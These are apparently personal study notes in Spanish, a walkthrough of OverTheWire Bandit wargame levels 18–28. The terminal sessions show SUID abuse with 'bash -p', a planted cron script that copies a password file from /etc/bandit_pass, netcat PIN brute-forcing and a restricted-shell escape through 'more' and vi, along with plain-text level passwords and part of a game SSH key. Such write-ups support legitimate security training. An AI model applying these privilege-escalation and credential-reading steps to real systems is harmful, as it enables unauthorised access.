---------------------------------------------------------------------------------------------------------------
BANDIT 18-19 : The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.
-----------------------------------------------------------------------------------------------------------------------------------------
❯ sshpass -p 'hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg' ssh bandit18@bandit.labs.overthewire.org -p 2220 whoami
  _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit18  //Me escupe el usuario
sshpass -p 'hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg' ssh bandit18@bandit.labs.overthewire.org -p 2220 bash
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames
whoami
bandit18
pwd
/home/bandit18
ls
readme
cat readme
awhqfNnAbc1naukrpqDYcF95h7HoMTrC
exit
❯ sshpass -p 'awhqfNnAbc1naukrpqDYcF95h7HoMTrC' ssh bandit19@bandit.labs.overthewire.org -p 2220
```


*Abusando de privilegios SUID para migrar de usuario*
```
---------------------------------------------------------------------------------------------------------------------------
BANDIT 19-20 : To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.
---------------------------------------------------------------------------------------------------------------------------
bandit19@bandit:~$ ls -l
total 16
-rwsr-x--- 1 bandit20 bandit19 14876 Jan 11 19:18 bandit20-do
bandit19@bandit:~$ ./bandit20-do
Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit:~$ ./bandit20-do whoami
bandit20
bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do bash
bash-5.1$ whoami
bandit19
bash-5.1$ exit
exit
bandit19@bandit:~$ ./bandit20-do sh
$ whoami
bandit19
$ exit
bandit19@bandit:~$ ./bandit20-do bash -p
bash-5.1$ whoami
bandit20
bash-5.1$ exit
exit
bandit19@bandit:~$ ./bandit20-do sh
$ wn
sh: 1: wn: not found
$ whoami
bandit19
$ exit
bandit19@bandit:~$ ./bandit20-do bash -p
bash-5.1$ whoami
bandit20
bash-5.1$ ls
bandit20-do
bash-5.1$ pwd
/home/bandit19
bash-5.1$ cd /home/bandit20
bash-5.1$ ls
suconnect
bash-5.1$ ls -l
total 16
-rwsr-x--- 1 bandit21 bandit20 15600 Jan 11 19:18 suconnect
bash-5.1$ cat /etc/bandit_pass/bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
```


*Jugando con conexiones*
- Usando Netcat – Algunos comandos prácticos: [https://blog.desdelinux.net/usando-netcat-algunos-comandos-practicos/](https://blog.desdelinux.net/usando-netcat-algunos-comandos-practicos/)
```
----------------------------------------------------------------------------------------------------------------------
BANDIT 20-21 : There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
----------------------------------------------------------------------------------------------------------------------------
DESDE UN TERMINAL QUE SE CONECTA:

❯  sshpass -p 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT' ssh bandit20@bandit.labs.overthewire.org -p 2220
bandit20@bandit:~$ nc -nlvp 4646
Listening on 0.0.0.0 4646
Connection received on 127.0.0.1 44070
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
bandit20@bandit:~$

DESDE LE TERMINAL QUE OYE:

❯  sshpass -p 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT' ssh bandit20@bandit.labs.overthewire.org -p 2220
bandit20@bandit:~$ ls -l
total 16
-rwsr-x--- 1 bandit21 bandit20 15600 Jan 11 19:18 suconnect
bandit20@bandit:~$ ./suconnect
Usage: ./suconnect <portnumber>
This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
bandit20@bandit:~$ ./suconnect 4646
                                                         bandit20@bandit:~$ ./suconnect 4646

Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
Password matches, sending next password

❯ sshpass -p 'NvEJF7oVjkddltPSrdKEFOllh9V1IBcq' ssh bandit21@bandit.labs.overthewire.org -p 2220
```


*Abusando de tareas Cron*
El formato de configuración de cron es el siguiente: **Minuto Hora Dia-del-Mes Mes Dia-de-la-Semana Comando-a-Ejecutar**

El intervalo de tiempo se especifica mediante 5 campos que representan, de izquierda a derecha:

- **Minutos**: de 0 a 59.
- **Horas**: de 0 a 23.
- **Día del mes**: de 1 a 31.
- **Mes**: de 1 a 12.
- **Día de la semana**: de 1 a 6 lunes a sábado (1=lunes, 2=martes, etc.) y 0 o 7 el domingo.

Si quisiéramos especificar todos los valores posibles de un parámetro (minutos, horas, etc.) podemos hacer uso del asterisco (*****). Esto implica que si en lugar de un número utilizamos un asterisco, el comando indicado se ejecutará cada minuto, hora, día de mes, mes o día de la semana, como en el siguiente ejemplo:

- Cron & Crontab, explicados: [https://blog.desdelinux.net/cron-crontab-explicados/](https://blog.desdelinux.net/cron-crontab-explicados/)

- [https://www.site24x7.com/es/tools/crontab/cron-generator.html](https://www.site24x7.com/es/tools/crontab/cron-generator.html)

*** * * * * /home/user/script.sh**
```
-------------------------------------------------------------------------------------------------------------------------------
BANDIT 21-22 : A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
------------------------------------------------------------------------------------------------------------------------------------
bandit21@bandit:~$ cd /etc/cron.d/
bandit21@bandit:/etc/cron.d$ ls -l
total 36
-rw-r--r-- 1 root root  62 Jan 11 19:18 cronjob_bandit15_root
-rw-r--r-- 1 root root  62 Jan 11 19:18 cronjob_bandit17_root
-rw-r--r-- 1 root root 120 Jan 11 19:18 cronjob_bandit22
-rw-r--r-- 1 root root 122 Jan 11 19:18 cronjob_bandit23
-rw-r--r-- 1 root root 120 Jan 11 19:18 cronjob_bandit24
-rw-r--r-- 1 root root  62 Jan 11 19:18 cronjob_bandit25_root
-rw-r--r-- 1 root root 201 Jan  8  2022 e2scrub_all
-rwx------ 1 root root  52 Jan 11 19:19 otw-tmp-dir
-rw-r--r-- 1 root root 396 Feb  2  2021 sysstat
bandit21@bandit:/etc/cron.d$ cat *
* * * * * root /usr/bin/cronjob_bandit15_root.sh &> /dev/null
* * * * * root /usr/bin/cronjob_bandit17_root.sh &> /dev/null
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * root /usr/bin/cronjob_bandit25_root.sh &> /dev/null
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
cat: otw-tmp-dir: Permission denied
# The first element of the path is a directory where the debian-sa1
# script is located
PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin

# Activity reports every 10 minutes everyday
5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1

# Additional run at 23:59 to rotate the statistics file
59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2

bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

bandit21@bandit:/etc/cron.d$ cd cronjob_bandit22
-bash: cd: cronjob_bandit22: Not a directory
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh

#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
bandit21@bandit:/etc/cron.d$ exit
logout
Connection to bandit.labs.overthewire.org closed.

-----------------------------------------------------------------------------------------
BANDIT 22-23 : A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
----------------------------------------------------------------------------------------------
bandit22@bandit:~$ cd /etc/cron.d/
bandit22@bandit:/etc/cron.d$ ls -l
total 36
-rw-r--r-- 1 root root  62 Jan 11 19:18 cronjob_bandit15_root
-rw-r--r-- 1 root root  62 Jan 11 19:18 cronjob_bandit17_root
-rw-r--r-- 1 root root 120 Jan 11 19:18 cronjob_bandit22
-rw-r--r-- 1 root root 122 Jan 11 19:18 cronjob_bandit23
-rw-r--r-- 1 root root 120 Jan 11 19:18 cronjob_bandit24
-rw-r--r-- 1 root root  62 Jan 11 19:18 cronjob_bandit25_root
-rw-r--r-- 1 root root 201 Jan  8  2022 e2scrub_all
-rwx------ 1 root root  52 Jan 11 19:19 otw-tmp-dir
-rw-r--r-- 1 root root 396 Feb  2  2021 sysstat
bandit22@bandit:/etc/cron.d$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:/etc/cron.d$ cat /etc/cron.d/cronjob_bandit23.sh
cat: /etc/cron.d/cronjob_bandit23.sh: No such file or directory
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
// Esto en forma de tarea Cron --> se ejecuta cada vez que enciendes la maquina(@reboot)
#!/bin/bash

myname=$(whoami)  // Nada mas correrlo como el propietario es Bandit23 -> whoami será Bandit23, estamos dentro
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)  // variable mytarget

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget  //pasamos la contraseña a mytarget

----------------------------------------------------------------------------------------------------------
INCISO: A la hora de pasarte archivos entre máquinas, si tienen el mismo hash md5sum no estaría manipulado
---------------------------------------------------------------------------------------------------------
bandit22@bandit:/etc/cron.d$ whoami
bandit22
bandit22@bandit:/etc/cron.d$ echo Iam user bandit23
Iam user bandit23
bandit22@bandit:/etc/cron.d$ echo Iam user bandit23 | md5sum
0eba6f4f634756b88308a3edcbe79d6a  -
bandit22@bandit:/etc/cron.d$ echo Iam user bandit23 | md5sum
0eba6f4f634756b88308a3edcbe79d6a  -

bandit22@bandit:/etc/cron.d$ echo Iam user bandit23 | md5sum | awk '{print $1}'
0eba6f4f634756b88308a3edcbe79d6a

bandit22@bandit:/etc/cron.d$ ls -l /tmp/0eba6f4f634756b88308a3edcbe79d6a
bandit22@bandit:/etc/cron.d$ ls -l /tmp/
-rw-rw-r-- 1 bandit23 bandit23 33 Jan 24 10:10 /tmp/8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:/etc/cron.d$ cat /tmp/0eba6f4f634756b88308a3edcbe79d6a
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
bandit22@bandit:/etc/cron.d$ exit
logout
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p 'QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G' ssh bandit23@bandit.labs.overthewire.org -p 2220

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 23-24 : A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ la -l
total 40
-rw-r--r-- 1 root root  62 Jan 11 19:18 cronjob_bandit15_root
-rw-r--r-- 1 root root  62 Jan 11 19:18 cronjob_bandit17_root
-rw-r--r-- 1 root root 120 Jan 11 19:18 cronjob_bandit22
-rw-r--r-- 1 root root 122 Jan 11 19:18 cronjob_bandit23
-rw-r--r-- 1 root root 120 Jan 11 19:18 cronjob_bandit24
-rw-r--r-- 1 root root  62 Jan 11 19:18 cronjob_bandit25_root
-rw-r--r-- 1 root root 201 Jan  8  2022 e2scrub_all
-rwx------ 1 root root  52 Jan 11 19:19 otw-tmp-dir
-rw-r--r-- 1 root root 102 Mar 23  2022 .placeholder
-rw-r--r-- 1 root root 396 Feb  2  2021 sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null  //***** TAREA QUE SE EJECUTA CADA MINUTO
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"  //Nos dirigimos a esta ruta
for i in * .*;  // PARA IR ITERANDO POR TODAS LAS CARPETAS Y SUBCARPETAS
do
    if [ "$i" != "." -a "$i" != ".." ]; // SI NO ES UN . O ..
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)" // ./ hace alusión al archivo que e que se encuentra en directorio actual
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i  //ejecuta el script
        fi
        rm -f ./$i
    fi
done


bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$
bandit23@bandit:/var/spool/bandit24$ ls  -l
drwxrwx-wx 6 root bandit24 4096 Jan 24 10:12 foo
--------------------------------------
para lo que sirve stat, es informacion
--------------------------------------
bandit23@bandit:/var/spool/bandit24/foo$ cd ..
bandit23@bandit:/var/spool/bandit24$ cd ..
bandit23@bandit:/var/spool$ stat bandit24
  File: bandit24
  Size: 4096            Blocks: 8          IO Block: 4096   directory
Device: 10301h/66305d   Inode: 528823      Links: 3
Access: (0550/dr-xr-x---)  Uid: (11024/bandit24)   Gid: (11023/bandit23)
Access: 2023-01-23 22:27:21.112736930 +0000
Modify: 2023-01-11 19:18:49.891045976 +0000
Change: 2023-01-11 19:18:49.903046024 +0000
 Birth: 2023-01-11 19:18:49.891045976 +0000
------------------------------------------
 probamos comando: stat --format "%U" ./$i
 -----------------------------------------

bandit23@bandit:/var/spool$ mktemp -d
/tmp/tmp.0YdNETJlk8
bandit23@bandit:/var/spool$ cd /tmp/tmp.0YdNETJlk8
bandit23@bandit:/tmp/tmp.0YdNETJlk8$ touch hola
bandit23@bandit:/tmp/tmp.0YdNETJlk8$ stat --format "%U" hola
bandit23  // No devuelve quien lo ha generado

bandit23@bandit:/$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ mktemp -d
/tmp/tmp.OB6cDlEpFa
bandit23@bandit:/var/spool/bandit24/foo$ dir_name=$(mktemp -d)
bandit23@bandit:/var/spool/bandit24/foo$ echo $dir_name
/tmp/tmp.dPvrDx61Ii
bandit23@bandit:/var/spool/bandit24/foo$ cd $dir_name
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$

bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ nano script.sh

bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ ls
script.sh
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ cp script.sh /var/spool/bandit24/foo/hola
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ ls -l
total 4
-rw-rw-r-- 1 bandit23 bandit23 12 Jan 24 11:16 script.sh
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ chmod +x script.sh
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ ls -l
total 4
-rwxrwxr-x 1 bandit23 bandit23 12 Jan 24 11:16 script.sh
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ ls /etc/bandit_pass/bandit24
/etc/bandit_pass/bandit24
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ nano script.sh

bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ pwd
/tmp/tmp.dPvrDx61Ii
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ nano script.sh

bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ chmod o+wx /tmp/tmp.dPvrDx61Ii
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ cp script.sh /var/spool/bandit24/foo/example
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ chmod +x /var/spool/bandit24/example
chmod: cannot access '/var/spool/bandit24/example': No such file or directory
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ chmod +x /var/spool/bandit24/foo/example
chmod: cannot access '/var/spool/bandit24/foo/example': No such file or directory
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ ls -l
total 4
-rw-rw-r-- 1 bandit24 bandit24   0 Jan 24 11:27 bandit24_password.log
-rwxrwxr-x 1 bandit23 bandit23 136 Jan 24 11:24 script.sh
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ watch -n 1 ls -l
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ cat script.sh
//------ este seria el script /--------------------
 #!bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.dPvrDx61Ii/bandit24_password.log
chmod o+r /tmp/tmp.dPvrDx61Ii/bandit24_password.log

----------------------------------------------------------

bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ nano script.sh

bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ cp script.sh /var/spool/bandit24/foo/testing
bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ watch -n 1 ls -l

------// Lo que te mostraria el watch //--------------------------------------
total 8
-rw-rw-r-- 1 bandit24 bandit24  33 Jan 24 11:31 bandit24_password.log
-rwxrwxr-x 1 bandit23 bandit23 140 Jan 24 11:30 script.sh

--------------------------------------------------------------------------------------------------------------

bandit23@bandit:/tmp/tmp.dPvrDx61Ii$ cat bandit24_password.log
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

❯ sshpass -p 'VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar' ssh bandit24@bandit.labs.overthewire.org -p 2220
```


*Cuestionario de tareas Cron*
![[Pasted image 20240709201753.png]]
![[Pasted image 20240709201811.png]]
![[Pasted image 20240709201833.png]]
![[Pasted image 20240709201853.png]]
![[Pasted image 20240709201924.png]]
![[Pasted image 20240709201942.png]]
![[Pasted image 20240709202002.png]]
![[Pasted image 20240709202025.png]]
![[Pasted image 20240709202042.png]]
![[Pasted image 20240709202109.png]]


*Fuerza Bruta aplicada a conexiones*
```
-----------------------------------------------------------------------------------------------------------------------
BANDIT 24-25 : A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time
-----------------------------------------------------------------------------------------------------------------------------------
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1234
Wrong! Please enter the correct pincode. Try again.
^C
bandit24@bandit:~$ echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1234" | nc localhosts 30002
nc: getaddrinfo for host "localhosts" port 30002: Temporary failure in name resolution
bandit24@bandit:~$ echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1234" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Timeout. Exiting.
bandit24@bandit:~$ for i in {00..09}; do echo $i;done
00
01
02
03
04
05
06
07
08
09
bandit24@bandit:~$ for pin in {0000..0009}; do echo $i; do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pin"; done

-bash: syntax error near unexpected token `do'
bandit24@bandit:~$ for pin in {0000..0009}; do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pin"; done
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0001
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0002
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0003
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0004
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0005
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0006
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0007
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0008
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0009

bandit24@bandit:~$ cd $dir_name
bandit24@bandit:/tmp/tmp.eVhdeA94Aj$ cd $dir_name
bandit24@bandit:/tmp/tmp.eVhdeA94Aj$ for pin in {0000..9999}; do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pin"; done > combinations.txt

bandit24@bandit:/tmp/tmp.eVhdeA94Aj$ cat combinations.txt | nc localhost 30002 | grep -vE "Wrong|PLease enter" // -vE para que no te imprima lo que lleve (v)wrong y (E)Please..
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

bandit24@bandit:/tmp/tmp.eVhdeA94Aj$ cat combinations.txt | nc localhost 30002 | grep -c "Wrong"
598  //Te lista el password

Exiting.
bandit24@bandit:/tmp/tmp.eVhdeA94Aj$

❯ sshpass -p 'p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d' ssh bandit25@bandit.labs.overthewire.org -p 2220
```


*Escapada del contexto de un comando*
```
----------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 25-26 : Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
---------------------------------------------------------------------------------------------------------------------------------------------------
bandit25@bandit:~$ ls -l
total 4
-r-------- 1 bandit25 bandit25 1679 Jan 11 19:18 bandit26.sshkey
bandit25@bandit:~$ cat bandit26.sshkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
......
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p2220
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to localhost closed.

// SE VUELVE A SALIR A BANDIT25

bandit25@bandit:~$ cat /etc/passwd | grep bandit26


  Enjoy your stay!

  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to localhost closed.
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /etc/passwd | grep bandit25
bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
bandit25@bandit:~$ cat /home/bandit26/text.txt
cat: /home/bandit26/text.txt: Permission denied

bandit25@bandit:~$ more /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
--More--(17%)
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p2220 whoami
//ARRANCA BANDIT26 PERO SE QUEDA PILLADO//

bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p2220 /bin/bash
//ARRANCA BANDIT26 PERO SE QUEDA PILLADO//

//JUGAREMOS CON EL MORE, Abrimos una ventana y ctr+shift+r agrandamos a tope, al conectarse por ssh el logo no aparecera del todo y more %66:
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
--More--(66%)

// TECLEAR V -> Estamos en modo visual
// Teclear ESC+SHIFT+:
// Escribir -> :set shell=/bin/bash +ENTER
               : shell +ENTER
bandit26@bandit:~$ whoami
bandit26
bandit26@bandit:~$ // Escapamos del contexto de more


------------------------------------------------------------------------------
BANDIT 26-27 : Good job getting a shell! Now hurry and grab the password for bandit27!
-------------------------------------------------------------------------------------
bandit26@bandit:~$ ls -l
total 20
-rwsr-x--- 1 bandit27 bandit26 14876 Jan 11 19:18 bandit27-do
-rw-r----- 1 bandit26 bandit26   258 Jan 11 19:18 text.txt
bandit26@bandit:~$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ bandit27
bandit27: command not found
bandit26@bandit:~$ whoami
bandit26
bandit26@bandit:~$ ./bandit27-do whoami
bandit27@bandit26@bandit:~$ ls -l
total 20
-rwsr-x--- 1 bandit27 bandit26 14876 Jan 11 19:18 bandit27-do
-rw-r----- 1 bandit26 bandit26   258 Jan 11 19:18 text.txt
bandit27@bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
❯ sshpass -p 'YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS' ssh bandit27@bandit.labs.overthewire.org -p 2220
```


*Operando con proyectos de Github*
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 27-28 : There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
bandit27@bandit:~$ mktemp -d
/tmp/tmp.jBmE9UPEof
bandit27@bandit:~$ cd /tmp/tmp.jBmE9UPEof
bandit27@bandit:/tmp/tmp.jBmE9UPEof$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
Cloning into 'repo'...
❯ sshpass -p 'AVanL161y9rsbcJIsFHuw35rjaOM19nR' ssh bandit28@bandit.labs.overthewire.org -p 2220
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BANDIT 28-29 : There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
bandit28@bandit:~$ ls
bandit28@bandit:~$ ls -l
total 0
bandit28@bandit:~$ mktemp -d
/tmp/tmp.yuStRuC7gE
bandit28@bandit:~$ cd /tmp/tmp.yuStRuC7gE
bandit28@bandit:/tmp/tmp.yuStRuC7gE$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
Cloning into 'repo'...
drwxrwxr-x 3 bandit28 bandit28 4096 Jan 25 09:12 repo
bandit28@bandit:/tmp/tmp.yuStRuC7gE$ cd repo/
bandit28@bandit:/tmp/tmp.yuStRuC7gE/repo$ ls
README.md
bandit28@bandit:/tmp/tmp.yuStRuC7gE/repo$ cat README.md
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

